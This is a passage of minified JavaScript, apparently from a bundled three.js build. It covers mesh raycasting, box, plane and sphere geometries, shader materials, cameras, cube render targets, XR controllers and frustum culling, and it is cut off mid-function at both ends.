o=e.boundingBox;o!==null&&(this.boundingBox=o.clone());const l=e.boundingSphere;return l!==null&&(this.boundingSphere=l.clone()),this.drawRange.start=e.drawRange.start,this.drawRange.count=e.drawRange.count,this.userData=e.userData,this}dispose(){this.dispatchEvent({type:"dispose"})}}const Rm=new St,_s=new $w,zo=new Sp,km=new G,Vo=new G,Ho=new G,Go=new G,mu=new G,Wo=new G,Lm=new G,jo=new G;class In extends $t{constructor(e=new Zn,n=new wp){super(),this.isMesh=!0,this.type="Mesh",this.geometry=e,this.material=n,this.morphTargetDictionary=void 0,this.morphTargetInfluences=void 0,this.count=1,this.updateMorphTargets()}copy(e,n){return super.copy(e,n),e.morphTargetInfluences!==void 0&&(this.morphTargetInfluences=e.morphTargetInfluences.slice()),e.morphTargetDictionary!==void 0&&(this.morphTargetDictionary=Object.assign({},e.morphTargetDictionary)),this.material=Array.isArray(e.material)?e.material.slice():e.material,this.geometry=e.geometry,this}updateMorphTargets(){const n=this.geometry.morphAttributes,i=Object.keys(n);if(i.length>0){const s=n[i[0]];if(s!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let r=0,a=s.length;r<a;r++){const o=s[r].name||String(r);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=r}}}}getVertexPosition(e,n){const i=this.geometry,s=i.attributes.position,r=i.morphAttributes.position,a=i.morphTargetsRelative;n.fromBufferAttribute(s,e);const o=this.morphTargetInfluences;if(r&&o){Wo.set(0,0,0);for(let l=0,c=r.length;l<c;l++){const h=o[l],d=r[l];h!==0&&(mu.fromBufferAttribute(d,e),a?Wo.addScaledVector(mu,h):Wo.addScaledVector(mu.sub(n),h))}n.add(Wo)}return n}raycast(e,n){const i=this.geometry,s=this.material,r=this.matrixWorld;s!==void 0&&(i.boundingSphere===null&&i.computeBoundingSphere(),zo.copy(i.boundingSphere),zo.applyMatrix4(r),_s.copy(e.ray).recast(e.near),!(zo.containsPoint(_s.origin)===!1&&(_s.intersectSphere(zo,km)===null||_s.origin.distanceToSquared(km)>(e.far-e.near)**2))&&(Rm.copy(r).invert(),_s.copy(e.ray).applyMatrix4(Rm),!(i.boundingBox!==null&&_s.intersectsBox(i.boundingBox)===!1)&&this._computeIntersections(e,n,_s)))}_computeIntersections(e,n,i){let s;const r=this.geometry,a=this.material,o=r.index,l=r.attributes.position,c=r.attributes.uv,h=r.attributes.uv1,d=r.attributes.normal,p=r.groups,f=r.drawRange;if(o!==null)if(Array.isArray(a))for(let y=0,_=p.length;y<_;y++){const g=p[y],u=a[g.materialIndex],v=Math.max(g.start,f.start),x=Math.min(o.count,Math.min(g.start+g.count,f.start+f.count));for(let S=v,E=x;S<E;S+=3){const A=o.getX(S),C=o.getX(S+1),L=o.getX(S+2);s=Xo(this,u,e,i,c,h,d,A,C,L),s&&(s.faceIndex=Math.floor(S/3),s.face.materialIndex=g.materialIndex,n.push(s))}}else{const y=Math.max(0,f.start),_=Math.min(o.count,f.start+f.count);for(let g=y,u=_;g<u;g+=3){const v=o.getX(g),x=o.getX(g+1),S=o.getX(g+2);s=Xo(this,a,e,i,c,h,d,v,x,S),s&&(s.faceIndex=Math.floor(g/3),n.push(s))}}else if(l!==void 0)if(Array.isArray(a))for(let y=0,_=p.length;y<_;y++){const g=p[y],u=a[g.materialIndex],v=Math.max(g.start,f.start),x=Math.min(l.count,Math.min(g.start+g.count,f.start+f.count));for(let S=v,E=x;S<E;S+=3){const A=S,C=S+1,L=S+2;s=Xo(this,u,e,i,c,h,d,A,C,L),s&&(s.faceIndex=Math.floor(S/3),s.face.materialIndex=g.materialIndex,n.push(s))}}else{const y=Math.max(0,f.start),_=Math.min(l.count,f.start+f.count);for(let g=y,u=_;g<u;g+=3){const v=g,x=g+1,S=g+2;s=Xo(this,a,e,i,c,h,d,v,x,S),s&&(s.faceIndex=Math.floor(g/3),n.push(s))}}}}function rM(t,e,n,i,s,r,a,o){let l;if(e.side===pn?l=i.intersectTriangle(a,r,s,!0,o):l=i.intersectTriangle(s,r,a,e.side===ds,o),l===null)return null;jo.copy(o),jo.applyMatrix4(t.matrixWorld);const c=n.ray.origin.distanceTo(jo);return c<n.near||c>n.far?null:{distance:c,point:jo.clone(),object:t}}function Xo(t,e,n,i,s,r,a,o,l,c){t.getVertexPosition(o,Vo),t.getVertexPosition(l,Ho),t.getVertexPosition(c,Go);const h=rM(t,e,n,i,Vo,Ho,Go,Lm);if(h){const d=new G;jn.getBarycoord(Lm,Vo,Ho,Go,d),s&&(h.uv=jn.getInterpolatedAttribute(s,o,l,c,d,new Je)),r&&(h.uv1=jn.getInterpolatedAttribute(r,o,l,c,d,new Je)),a&&(h.normal=jn.getInterpolatedAttribute(a,o,l,c,d,new G),h.normal.dot(i.direction)>0&&h.normal.multiplyScalar(-1));const p={a:o,b:l,c,normal:new G,materialIndex:0};jn.getNormal(Vo,Ho,Go,p.normal),h.face=p,h.barycoord=d}return h}class oo extends Zn{constructor(e=1,n=1,i=1,s=1,r=1,a=1){super(),this.type="BoxGeometry",this.parameters={width:e,height:n,depth:i,widthSegments:s,heightSegments:r,depthSegments:a};const o=this;s=Math.floor(s),r=Math.floor(r),a=Math.floor(a);const l=[],c=[],h=[],d=[];let p=0,f=0;y("z","y","x",-1,-1,i,n,e,a,r,0),y("z","y","x",1,-1,i,n,-e,a,r,1),y("x","z","y",1,1,e,i,n,s,a,2),y("x","z","y",1,-1,e,i,-n,s,a,3),y("x","y","z",1,-1,e,n,i,s,r,4),y("x","y","z",-1,-1,e,n,-i,s,r,5),this.setIndex(l),this.setAttribute("position",new tn(c,3)),this.setAttribute("normal",new tn(h,3)),this.setAttribute("uv",new tn(d,2));function y(_,g,u,v,x,S,E,A,C,L,w){const M=S/C,k=E/L,H=S/2,V=E/2,W=A/2,j=C+1,X=L+1;let D=0,N=0;const O=new G;for(let B=0;B<X;B++){const J=B*k-V;for(let oe=0;oe<j;oe++){const ge=oe*M-H;O[_]=ge*v,O[g]=J*x,O[u]=W,c.push(O.x,O.y,O.z),O[_]=0,O[g]=0,O[u]=A>0?1:-1,h.push(O.x,O.y,O.z),d.push(oe/C),d.push(1-B/L),D+=1}}for(let B=0;B<L;B++)for(let J=0;J<C;J++){const oe=p+J+j*B,ge=p+J+j*(B+1),ze=p+(J+1)+j*(B+1),Ye=p+(J+1)+j*B;l.push(oe,ge,Ye),l.push(ge,ze,Ye),N+=6}o.addGroup(f,N,w),f+=N,p+=D}}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new oo(e.width,e.height,e.depth,e.widthSegments,e.heightSegments,e.depthSegments)}}function Br(t){const e={};for(const n in t){e[n]={};for(const i in t[n]){const s=t[n][i];s&&(s.isColor||s.isMatrix3||s.isMatrix4||s.isVector2||s.isVector3||s.isVector4||s.isTexture||s.isQuaternion)?s.isRenderTargetTexture?(Ie("UniformsUtils: Textures of render targets cannot be cloned via cloneUniforms() or mergeUniforms()."),e[n][i]=null):e[n][i]=s.clone():Array.isArray(s)?e[n][i]=s.slice():e[n][i]=s}}return e}function Jt(t){const e={};for(let n=0;n<t.length;n++){const i=Br(t[n]);for(const s in i)e[s]=i[s]}return e}function aM(t){const e=[];for(let n=0;n<t.length;n++)e.push(t[n].clone());return e}function cy(t){const e=t.getRenderTarget();return e===null?t.outputColorSpace:e.isXRRenderTarget===!0?e.texture.colorSpace:je.workingColorSpace}const oM={clone:Br,merge:Jt};var lM=`void main() {
	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
}`,cM=`void main() {
	gl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );
}`;class pi extends ao{constructor(e){super(),this.isShaderMaterial=!0,this.type="ShaderMaterial",this.defines={},this.uniforms={},this.uniformsGroups=[],this.vertexShader=lM,this.fragmentShader=cM,this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.clipping=!1,this.forceSinglePass=!0,this.extensions={clipCullDistance:!1,multiDraw:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv1:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,this.glslVersion=null,e!==void 0&&this.setValues(e)}copy(e){return super.copy(e),this.fragmentShader=e.fragmentShader,this.vertexShader=e.vertexShader,this.uniforms=Br(e.uniforms),this.uniformsGroups=aM(e.uniformsGroups),this.defines=Object.assign({},e.defines),this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.fog=e.fog,this.lights=e.lights,this.clipping=e.clipping,this.extensions=Object.assign({},e.extensions),this.glslVersion=e.glslVersion,this.defaultAttributeValues=Object.assign({},e.defaultAttributeValues),this.index0AttributeName=e.index0AttributeName,this.uniformsNeedUpdate=e.uniformsNeedUpdate,this}toJSON(e){const n=super.toJSON(e);n.glslVersion=this.glslVersion,n.uniforms={};for(const s in this.uniforms){const a=this.uniforms[s].value;a&&a.isTexture?n.uniforms[s]={type:"t",value:a.toJSON(e).uuid}:a&&a.isColor?n.uniforms[s]={type:"c",value:a.getHex()}:a&&a.isVector2?n.uniforms[s]={type:"v2",value:a.toArray()}:a&&a.isVector3?n.uniforms[s]={type:"v3",value:a.toArray()}:a&&a.isVector4?n.uniforms[s]={type:"v4",value:a.toArray()}:a&&a.isMatrix3?n.uniforms[s]={type:"m3",value:a.toArray()}:a&&a.isMatrix4?n.uniforms[s]={type:"m4",value:a.toArray()}:n.uniforms[s]={value:a}}Object.keys(this.defines).length>0&&(n.defines=this.defines),n.vertexShader=this.vertexShader,n.fragmentShader=this.fragmentShader,n.lights=this.lights,n.clipping=this.clipping;const i={};for(const s in this.extensions)this.extensions[s]===!0&&(i[s]=!0);return Object.keys(i).length>0&&(n.extensions=i),n}}class uy extends $t{constructor(){super(),this.isCamera=!0,this.type="Camera",this.matrixWorldInverse=new St,this.projectionMatrix=new St,this.projectionMatrixInverse=new St,this.coordinateSystem=ri,this._reversedDepth=!1}get reversedDepth(){return this._reversedDepth}copy(e,n){return super.copy(e,n),this.matrixWorldInverse.copy(e.matrixWorldInverse),this.projectionMatrix.copy(e.projectionMatrix),this.projectionMatrixInverse.copy(e.projectionMatrixInverse),this.coordinateSystem=e.coordinateSystem,this}getWorldDirection(e){return super.getWorldDirection(e).negate()}updateMatrixWorld(e){super.updateMatrixWorld(e),this.matrixWorldInverse.copy(this.matrixWorld).invert()}updateWorldMatrix(e,n){super.updateWorldMatrix(e,n),this.matrixWorldInverse.copy(this.matrixWorld).invert()}clone(){return new this.constructor().copy(this)}}const Gi=new G,Pm=new Je,Nm=new Je;class xn extends uy{constructor(e=50,n=1,i=.1,s=2e3){super(),this.isPerspectiveCamera=!0,this.type="PerspectiveCamera",this.fov=e,this.zoom=1,this.near=i,this.far=s,this.focus=10,this.aspect=n,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}copy(e,n){return super.copy(e,n),this.fov=e.fov,this.zoom=e.zoom,this.near=e.near,this.far=e.far,this.focus=e.focus,this.aspect=e.aspect,this.view=e.view===null?null:Object.assign({},e.view),this.filmGauge=e.filmGauge,this.filmOffset=e.filmOffset,this}setFocalLength(e){const n=.5*this.getFilmHeight()/e;this.fov=hh*2*Math.atan(n),this.updateProjectionMatrix()}getFocalLength(){const e=Math.tan(Yc*.5*this.fov);return .5*this.getFilmHeight()/e}getEffectiveFOV(){return hh*2*Math.atan(Math.tan(Yc*.5*this.fov)/this.zoom)}getFilmWidth(){return this.filmGauge*Math.min(this.aspect,1)}getFilmHeight(){return this.filmGauge/Math.max(this.aspect,1)}getViewBounds(e,n,i){Gi.set(-1,-1,.5).applyMatrix4(this.projectionMatrixInverse),n.set(Gi.x,Gi.y).multiplyScalar(-e/Gi.z),Gi.set(1,1,.5).applyMatrix4(this.projectionMatrixInverse),i.set(Gi.x,Gi.y).multiplyScalar(-e/Gi.z)}getViewSize(e,n){return this.getViewBounds(e,Pm,Nm),n.subVectors(Nm,Pm)}setViewOffset(e,n,i,s,r,a){this.aspect=e/n,this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=n,this.view.offsetX=i,this.view.offsetY=s,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=this.near;let n=e*Math.tan(Yc*.5*this.fov)/this.zoom,i=2*n,s=this.aspect*i,r=-.5*s;const a=this.view;if(this.view!==null&&this.view.enabled){const l=a.fullWidth,c=a.fullHeight;r+=a.offsetX*s/l,n-=a.offsetY*i/c,s*=a.width/l,i*=a.height/c}const o=this.filmOffset;o!==0&&(r+=e*o/this.getFilmWidth()),this.projectionMatrix.makePerspective(r,r+s,n,n-i,e,this.far,this.coordinateSystem,this.reversedDepth),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const n=super.toJSON(e);return n.object.fov=this.fov,n.object.zoom=this.zoom,n.object.near=this.near,n.object.far=this.far,n.object.focus=this.focus,n.object.aspect=this.aspect,this.view!==null&&(n.object.view=Object.assign({},this.view)),n.object.filmGauge=this.filmGauge,n.object.filmOffset=this.filmOffset,n}}const sr=-90,rr=1;class uM extends $t{constructor(e,n,i){super(),this.type="CubeCamera",this.renderTarget=i,this.coordinateSystem=null,this.activeMipmapLevel=0;const s=new xn(sr,rr,e,n);s.layers=this.layers,this.add(s);const r=new xn(sr,rr,e,n);r.layers=this.layers,this.add(r);const a=new xn(sr,rr,e,n);a.layers=this.layers,this.add(a);const o=new xn(sr,rr,e,n);o.layers=this.layers,this.add(o);const l=new xn(sr,rr,e,n);l.layers=this.layers,this.add(l);const c=new xn(sr,rr,e,n);c.layers=this.layers,this.add(c)}updateCoordinateSystem(){const e=this.coordinateSystem,n=this.children.concat(),[i,s,r,a,o,l]=n;for(const c of n)this.remove(c);if(e===ri)i.up.set(0,1,0),i.lookAt(1,0,0),s.up.set(0,1,0),s.lookAt(-1,0,0),r.up.set(0,0,-1),r.lookAt(0,1,0),a.up.set(0,0,1),a.lookAt(0,-1,0),o.up.set(0,1,0),o.lookAt(0,0,1),l.up.set(0,1,0),l.lookAt(0,0,-1);else if(e===zl)i.up.set(0,-1,0),i.lookAt(-1,0,0),s.up.set(0,-1,0),s.lookAt(1,0,0),r.up.set(0,0,1),r.lookAt(0,1,0),a.up.set(0,0,-1),a.lookAt(0,-1,0),o.up.set(0,-1,0),o.lookAt(0,0,1),l.up.set(0,-1,0),l.lookAt(0,0,-1);else throw new Error("THREE.CubeCamera.updateCoordinateSystem(): Invalid coordinate system: "+e);for(const c of n)this.add(c),c.updateMatrixWorld()}update(e,n){this.parent===null&&this.updateMatrixWorld();const{renderTarget:i,activeMipmapLevel:s}=this;this.coordinateSystem!==e.coordinateSystem&&(this.coordinateSystem=e.coordinateSystem,this.updateCoordinateSystem());const[r,a,o,l,c,h]=this.children,d=e.getRenderTarget(),p=e.getActiveCubeFace(),f=e.getActiveMipmapLevel(),y=e.xr.enabled;e.xr.enabled=!1;const _=i.texture.generateMipmaps;i.texture.generateMipmaps=!1,e.setRenderTarget(i,0,s),e.render(n,r),e.setRenderTarget(i,1,s),e.render(n,a),e.setRenderTarget(i,2,s),e.render(n,o),e.setRenderTarget(i,3,s),e.render(n,l),e.setRenderTarget(i,4,s),e.render(n,c),i.texture.generateMipmaps=_,e.setRenderTarget(i,5,s),e.render(n,h),e.setRenderTarget(d,p,f),e.xr.enabled=y,i.texture.needsPMREMUpdate=!0}}class dy extends Yt{constructor(e=[],n=Vs,i,s,r,a,o,l,c,h){super(e,n,i,s,r,a,o,l,c,h),this.isCubeTexture=!0,this.flipY=!1}get images(){return this.image}set images(e){this.image=e}}class hy extends ci{constructor(e=1,n={}){super(e,e,n),this.isWebGLCubeRenderTarget=!0;const i={width:e,height:e,depth:1},s=[i,i,i,i,i,i];this.texture=new dy(s),this._setTextureOptions(n),this.texture.isRenderTargetTexture=!0}fromEquirectangularTexture(e,n){this.texture.type=n.type,this.texture.colorSpace=n.colorSpace,this.texture.generateMipmaps=n.generateMipmaps,this.texture.minFilter=n.minFilter,this.texture.magFilter=n.magFilter;const i={uniforms:{tEquirect:{value:null}},vertexShader:`

				varying vec3 vWorldDirection;

				vec3 transformDirection( in vec3 dir, in mat4 matrix ) {

					return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );

				}

				void main() {

					vWorldDirection = transformDirection( position, modelMatrix );

					#include <begin_vertex>
					#include <project_vertex>

				}
			`,fragmentShader:`

				uniform sampler2D tEquirect;

				varying vec3 vWorldDirection;

				#include <common>

				void main() {

					vec3 direction = normalize( vWorldDirection );

					vec2 sampleUV = equirectUv( direction );

					gl_FragColor = texture2D( tEquirect, sampleUV );

				}
			`},s=new oo(5,5,5),r=new pi({name:"CubemapFromEquirect",uniforms:Br(i.uniforms),vertexShader:i.vertexShader,fragmentShader:i.fragmentShader,side:pn,blending:Ci});r.uniforms.tEquirect.value=n;const a=new In(s,r),o=n.minFilter;return n.minFilter===Ps&&(n.minFilter=qt),new uM(1,10,this).update(e,a),n.minFilter=o,a.geometry.dispose(),a.material.dispose(),this}clear(e,n=!0,i=!0,s=!0){const r=e.getRenderTarget();for(let a=0;a<6;a++)e.setRenderTarget(this,a),e.clear(n,i,s);e.setRenderTarget(r)}}class fa extends $t{constructor(){super(),this.isGroup=!0,this.type="Group"}}const dM={type:"move"};class gu{constructor(){this._targetRay=null,this._grip=null,this._hand=null}getHandSpace(){return this._hand===null&&(this._hand=new fa,this._hand.matrixAutoUpdate=!1,this._hand.visible=!1,this._hand.joints={},this._hand.inputState={pinching:!1}),this._hand}getTargetRaySpace(){return this._targetRay===null&&(this._targetRay=new fa,this._targetRay.matrixAutoUpdate=!1,this._targetRay.visible=!1,this._targetRay.hasLinearVelocity=!1,this._targetRay.linearVelocity=new G,this._targetRay.hasAngularVelocity=!1,this._targetRay.angularVelocity=new G),this._targetRay}getGripSpace(){return this._grip===null&&(this._grip=new fa,this._grip.matrixAutoUpdate=!1,this._grip.visible=!1,this._grip.hasLinearVelocity=!1,this._grip.linearVelocity=new G,this._grip.hasAngularVelocity=!1,this._grip.angularVelocity=new G),this._grip}dispatchEvent(e){return this._targetRay!==null&&this._targetRay.dispatchEvent(e),this._grip!==null&&this._grip.dispatchEvent(e),this._hand!==null&&this._hand.dispatchEvent(e),this}connect(e){if(e&&e.hand){const n=this._hand;if(n)for(const i of e.hand.values())this._getHandJoint(n,i)}return this.dispatchEvent({type:"connected",data:e}),this}disconnect(e){return this.dispatchEvent({type:"disconnected",data:e}),this._targetRay!==null&&(this._targetRay.visible=!1),this._grip!==null&&(this._grip.visible=!1),this._hand!==null&&(this._hand.visible=!1),this}update(e,n,i){let s=null,r=null,a=null;const o=this._targetRay,l=this._grip,c=this._hand;if(e&&n.session.visibilityState!=="visible-blurred"){if(c&&e.hand){a=!0;for(const _ of e.hand.values()){const g=n.getJointPose(_,i),u=this._getHandJoint(c,_);g!==null&&(u.matrix.fromArray(g.transform.matrix),u.matrix.decompose(u.position,u.rotation,u.scale),u.matrixWorldNeedsUpdate=!0,u.jointRadius=g.radius),u.visible=g!==null}const h=c.joints["index-finger-tip"],d=c.joints["thumb-tip"],p=h.position.distanceTo(d.position),f=.02,y=.005;c.inputState.pinching&&p>f+y?(c.inputState.pinching=!1,this.dispatchEvent({type:"pinchend",handedness:e.handedness,target:this})):!c.inputState.pinching&&p<=f-y&&(c.inputState.pinching=!0,this.dispatchEvent({type:"pinchstart",handedness:e.handedness,target:this}))}else l!==null&&e.gripSpace&&(r=n.getPose(e.gripSpace,i),r!==null&&(l.matrix.fromArray(r.transform.matrix),l.matrix.decompose(l.position,l.rotation,l.scale),l.matrixWorldNeedsUpdate=!0,r.linearVelocity?(l.hasLinearVelocity=!0,l.linearVelocity.copy(r.linearVelocity)):l.hasLinearVelocity=!1,r.angularVelocity?(l.hasAngularVelocity=!0,l.angularVelocity.copy(r.angularVelocity)):l.hasAngularVelocity=!1));o!==null&&(s=n.getPose(e.targetRaySpace,i),s===null&&r!==null&&(s=r),s!==null&&(o.matrix.fromArray(s.transform.matrix),o.matrix.decompose(o.position,o.rotation,o.scale),o.matrixWorldNeedsUpdate=!0,s.linearVelocity?(o.hasLinearVelocity=!0,o.linearVelocity.copy(s.linearVelocity)):o.hasLinearVelocity=!1,s.angularVelocity?(o.hasAngularVelocity=!0,o.angularVelocity.copy(s.angularVelocity)):o.hasAngularVelocity=!1,this.dispatchEvent(dM)))}return o!==null&&(o.visible=s!==null),l!==null&&(l.visible=r!==null),c!==null&&(c.visible=a!==null),this}_getHandJoint(e,n){if(e.joints[n.jointName]===void 0){const i=new fa;i.matrixAutoUpdate=!1,i.visible=!1,e.joints[n.jointName]=i,e.add(i)}return e.joints[n.jointName]}}class hM extends $t{constructor(){super(),this.isScene=!0,this.type="Scene",this.background=null,this.environment=null,this.fog=null,this.backgroundBlurriness=0,this.backgroundIntensity=1,this.backgroundRotation=new hi,this.environmentIntensity=1,this.environmentRotation=new hi,this.overrideMaterial=null,typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}copy(e,n){return super.copy(e,n),e.background!==null&&(this.background=e.background.clone()),e.environment!==null&&(this.environment=e.environment.clone()),e.fog!==null&&(this.fog=e.fog.clone()),this.backgroundBlurriness=e.backgroundBlurriness,this.backgroundIntensity=e.backgroundIntensity,this.backgroundRotation.copy(e.backgroundRotation),this.environmentIntensity=e.environmentIntensity,this.environmentRotation.copy(e.environmentRotation),e.overrideMaterial!==null&&(this.overrideMaterial=e.overrideMaterial.clone()),this.matrixAutoUpdate=e.matrixAutoUpdate,this}toJSON(e){const n=super.toJSON(e);return this.fog!==null&&(n.object.fog=this.fog.toJSON()),this.backgroundBlurriness>0&&(n.object.backgroundBlurriness=this.backgroundBlurriness),this.backgroundIntensity!==1&&(n.object.backgroundIntensity=this.backgroundIntensity),n.object.backgroundRotation=this.backgroundRotation.toArray(),this.environmentIntensity!==1&&(n.object.environmentIntensity=this.environmentIntensity),n.object.environmentRotation=this.environmentRotation.toArray(),n}}class pM extends Yt{constructor(e=null,n=1,i=1,s,r,a,o,l,c=Bt,h=Bt,d,p){super(null,a,o,l,c,h,s,r,d,p),this.isDataTexture=!0,this.image={data:e,width:n,height:i},this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}const vu=new G,fM=new G,mM=new Ue;class Ts{constructor(e=new G(1,0,0),n=0){this.isPlane=!0,this.normal=e,this.constant=n}set(e,n){return this.normal.copy(e),this.constant=n,this}setComponents(e,n,i,s){return this.normal.set(e,n,i),this.constant=s,this}setFromNormalAndCoplanarPoint(e,n){return this.normal.copy(e),this.constant=-n.dot(this.normal),this}setFromCoplanarPoints(e,n,i){const s=vu.subVectors(i,n).cross(fM.subVectors(e,n)).normalize();return this.setFromNormalAndCoplanarPoint(s,e),this}copy(e){return this.normal.copy(e.normal),this.constant=e.constant,this}normalize(){const e=1/this.normal.length();return this.normal.multiplyScalar(e),this.constant*=e,this}negate(){return this.constant*=-1,this.normal.negate(),this}distanceToPoint(e){return this.normal.dot(e)+this.constant}distanceToSphere(e){return this.distanceToPoint(e.center)-e.radius}projectPoint(e,n){return n.copy(e).addScaledVector(this.normal,-this.distanceToPoint(e))}intersectLine(e,n){const i=e.delta(vu),s=this.normal.dot(i);if(s===0)return this.distanceToPoint(e.start)===0?n.copy(e.start):null;const r=-(e.start.dot(this.normal)+this.constant)/s;return r<0||r>1?null:n.copy(e.start).addScaledVector(i,r)}intersectsLine(e){const n=this.distanceToPoint(e.start),i=this.distanceToPoint(e.end);return n<0&&i>0||i<0&&n>0}intersectsBox(e){return e.intersectsPlane(this)}intersectsSphere(e){return e.intersectsPlane(this)}coplanarPoint(e){return e.copy(this.normal).multiplyScalar(-this.constant)}applyMatrix4(e,n){const i=n||mM.getNormalMatrix(e),s=this.coplanarPoint(vu).applyMatrix4(e),r=this.normal.applyMatrix3(i).normalize();return this.constant=-s.dot(r),this}translate(e){return this.constant-=e.dot(this.normal),this}equals(e){return e.normal.equals(this.normal)&&e.constant===this.constant}clone(){return new this.constructor().copy(this)}}const bs=new Sp,gM=new Je(.5,.5),qo=new G;class Mp{constructor(e=new Ts,n=new Ts,i=new Ts,s=new Ts,r=new Ts,a=new Ts){this.planes=[e,n,i,s,r,a]}set(e,n,i,s,r,a){const o=this.planes;return o[0].copy(e),o[1].copy(n),o[2].copy(i),o[3].copy(s),o[4].copy(r),o[5].copy(a),this}copy(e){const n=this.planes;for(let i=0;i<6;i++)n[i].copy(e.planes[i]);return this}setFromProjectionMatrix(e,n=ri,i=!1){const s=this.planes,r=e.elements,a=r[0],o=r[1],l=r[2],c=r[3],h=r[4],d=r[5],p=r[6],f=r[7],y=r[8],_=r[9],g=r[10],u=r[11],v=r[12],x=r[13],S=r[14],E=r[15];if(s[0].setComponents(c-a,f-h,u-y,E-v).normalize(),s[1].setComponents(c+a,f+h,u+y,E+v).normalize(),s[2].setComponents(c+o,f+d,u+_,E+x).normalize(),s[3].setComponents(c-o,f-d,u-_,E-x).normalize(),i)s[4].setComponents(l,p,g,S).normalize(),s[5].setComponents(c-l,f-p,u-g,E-S).normalize();else if(s[4].setComponents(c-l,f-p,u-g,E-S).normalize(),n===ri)s[5].setComponents(c+l,f+p,u+g,E+S).normalize();else if(n===zl)s[5].setComponents(l,p,g,S).normalize();else throw new Error("THREE.Frustum.setFromProjectionMatrix(): Invalid coordinate system: "+n);return this}intersectsObject(e){if(e.boundingSphere!==void 0)e.boundingSphere===null&&e.computeBoundingSphere(),bs.copy(e.boundingSphere).applyMatrix4(e.matrixWorld);else{const n=e.geometry;n.boundingSphere===null&&n.computeBoundingSphere(),bs.copy(n.boundingSphere).applyMatrix4(e.matrixWorld)}return this.intersectsSphere(bs)}intersectsSprite(e){bs.center.set(0,0,0);const n=gM.distanceTo(e.center);return bs.radius=.7071067811865476+n,bs.applyMatrix4(e.matrixWorld),this.intersectsSphere(bs)}intersectsSphere(e){const n=this.planes,i=e.center,s=-e.radius;for(let r=0;r<6;r++)if(n[r].distanceToPoint(i)<s)return!1;return!0}intersectsBox(e){const n=this.planes;for(let i=0;i<6;i++){const s=n[i];if(qo.x=s.normal.x>0?e.max.x:e.min.x,qo.y=s.normal.y>0?e.max.y:e.min.y,qo.z=s.normal.z>0?e.max.z:e.min.z,s.distanceToPoint(qo)<0)return!1}return!0}containsPoint(e){const n=this.planes;for(let i=0;i<6;i++)if(n[i].distanceToPoint(e)<0)return!1;return!0}clone(){return new this.constructor().copy(this)}}class vM extends Yt{constructor(e,n,i,s,r,a,o,l,c){super(e,n,i,s,r,a,o,l,c),this.isCanvasTexture=!0,this.needsUpdate=!0}}class $a extends Yt{constructor(e,n,i=di,s,r,a,o=Bt,l=Bt,c,h=Di,d=1){if(h!==Di&&h!==Ns)throw new Error("DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat");const p={width:e,height:n,depth:d};super(p,s,r,a,o,l,h,i,c),this.isDepthTexture=!0,this.flipY=!1,this.generateMipmaps=!1,this.compareFunction=null}copy(e){return super.copy(e),this.source=new bp(Object.assign({},e.image)),this.compareFunction=e.compareFunction,this}toJSON(e){const n=super.toJSON(e);return this.compareFunction!==null&&(n.compareFunction=this.compareFunction),n}}class yM extends $a{constructor(e,n=di,i=Vs,s,r,a=Bt,o=Bt,l,c=Di){const h={width:e,height:e,depth:1},d=[h,h,h,h,h,h];super(e,e,n,i,s,r,a,o,l,c),this.image=d,this.isCubeDepthTexture=!0,this.isCubeTexture=!0}get images(){return this.image}set images(e){this.image=e}}class py extends Yt{constructor(e=null){super(),this.sourceTexture=e,this.isExternalTexture=!0}copy(e){return super.copy(e),this.sourceTexture=e.sourceTexture,this}}class oc extends Zn{constructor(e=1,n=1,i=1,s=1){super(),this.type="PlaneGeometry",this.parameters={width:e,height:n,widthSegments:i,heightSegments:s};const r=e/2,a=n/2,o=Math.floor(i),l=Math.floor(s),c=o+1,h=l+1,d=e/o,p=n/l,f=[],y=[],_=[],g=[];for(let u=0;u<h;u++){const v=u*p-a;for(let x=0;x<c;x++){const S=x*d-r;y.push(S,-v,0),_.push(0,0,1),g.push(x/o),g.push(1-u/l)}}for(let u=0;u<l;u++)for(let v=0;v<o;v++){const x=v+c*u,S=v+c*(u+1),E=v+1+c*(u+1),A=v+1+c*u;f.push(x,S,A),f.push(S,E,A)}this.setIndex(f),this.setAttribute("position",new tn(y,3)),this.setAttribute("normal",new tn(_,3)),this.setAttribute("uv",new tn(g,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new oc(e.width,e.height,e.widthSegments,e.heightSegments)}}class Ep extends Zn{constructor(e=1,n=32,i=16,s=0,r=Math.PI*2,a=0,o=Math.PI){super(),this.type="SphereGeometry",this.parameters={radius:e,widthSegments:n,heightSegments:i,phiStart:s,phiLength:r,thetaStart:a,thetaLength:o},n=Math.max(3,Math.floor(n)),i=Math.max(2,Math.floor(i));const l=Math.min(a+o,Math.PI);let c=0;const h=[],d=new G,p=new G,f=[],y=[],_=[],g=[];for(let u=0;u<=i;u++){const v=[],x=u/i;let S=0;u===0&&a===0?S=.5/n:u===i&&l===Math.PI&&(S=-.5/n);for(let E=0;E<=n;E++){const A=E/n;d.x=-e*Math.cos(s+A*r)*Math.sin(a+x*o),d.y=e*Math.cos(a+x*o),d.z=e*Math.sin(s+A*r)*Math.sin(a+x*o),y.push(d.x,d.y,d.z),p.copy(d).normalize(),_.push(p.x,p.y,p.z),g.push(A+S,1-x),v.push(c++)}h.push(v)}for(let 